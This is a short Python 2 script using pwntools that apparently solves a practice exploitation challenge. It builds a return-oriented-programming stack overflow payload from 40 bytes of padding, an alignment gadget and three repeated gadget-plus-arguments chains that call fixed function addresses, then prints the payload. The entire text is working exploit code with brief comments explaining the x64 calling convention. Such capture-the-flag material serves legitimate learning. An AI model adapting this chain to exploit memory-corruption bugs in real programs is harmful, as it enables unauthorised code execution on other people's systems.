from pwn import *

payload = "A" * 40
payload += p64(0x00401ab0+3) ## padding for ubuntu users which points to ret instruction
arg  = p64(1) + p64(2) + p64(3) ## arguments
gad = p64(0x0000000000401ab0)
payload += gad ## why address of gadgets first? because on x64 arch we provide args in registers so we have to make sure we push args into the registers before calling our function
payload += arg
payload += p64(0x0000000000401850)
payload += gad
payload += arg
payload += p64(0x0000000000401870)
payload += gad
payload += arg
payload += p64(0x0000000000401810)
payload += "AAAAAAAA"
print payload
